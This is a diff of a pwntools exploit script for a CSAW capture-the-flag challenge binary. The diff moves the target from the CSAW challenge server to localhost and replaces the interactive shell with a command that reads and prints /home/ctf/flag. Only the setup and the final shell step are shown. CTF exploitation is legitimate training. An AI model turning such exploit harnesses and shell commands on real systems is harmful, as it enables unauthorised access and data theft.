@@ -1,9 +1,9 @@
 from pwn import *
 context.arch='amd64'
 context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-context.log_level = 'debug'
-p= remote("pwn.chal.csaw.io",5001)
-# p=process('./cryptown',env={"LD_PRELOAD":"./libc-2.31.so"})
+#context.log_level = 'debug'
+p= remote("localhost",5001)
+#p=process('./cryptown',env={"LD_PRELOAD":"./libc-2.31.so"})
 # p=process('./cryptown')#,env={"LD_PRELOAD":"./libc-2.31.so"})
 
 ru 		= lambda a: 	p.readuntil(a)
@@ -176,7 +176,11 @@ def exp():
     cmd(1)
     sla(": ",str(ct+1).encode())
     # gdb.attach(p,'b readn')
-    p.interactive()
+    #p.interactive()
+    p.sendline(b'cat /home/ctf/flag')
+    flag = p.recv(1024)
+    print(flag)
+    exit(0)
 
 if __name__ == "__main__":
     exp()
